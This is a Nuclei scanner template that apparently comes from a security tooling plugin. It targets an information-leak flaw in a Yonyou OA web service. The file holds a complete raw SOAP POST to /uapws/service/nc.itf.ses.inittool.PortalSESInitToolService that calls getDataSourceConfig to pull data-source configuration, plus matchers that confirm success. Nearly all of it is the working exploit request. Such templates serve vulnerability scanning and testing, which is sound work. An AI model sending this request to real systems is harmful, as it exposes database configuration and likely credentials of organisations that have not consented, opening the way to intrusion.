plugin/tools/nuclei_templates/yongyou-PortalSESInitToolService-information-leak.yaml

id: yongyou-PortalSESInitToolService-information-leak

info:
  name: 用友OA接口nc.itf.ses.inittool.PortalSESInitToolService存在信息泄露漏洞
  author: g3m
  severity: high

http:
  - raw:
    - |
      @timeout 30s
      POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Connection: close
      Cookie: JSESSIONID=7A0EE22D40FE0E3778AC89954C605474
      Upgrade-Insecure-Requests: 1
      Priority: u=0, i
      Content-Length: 256

      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
         <soapenv:Header/>
         <soapenv:Body>
            <por:getDataSourceConfig/>
         </soapenv:Body>
      </soapenv:Envelope>

    matchers-condition: and
    matchers:
    - type: word
      words:
        - '127.0.0.1'
    - type: status
      status:
        - 200

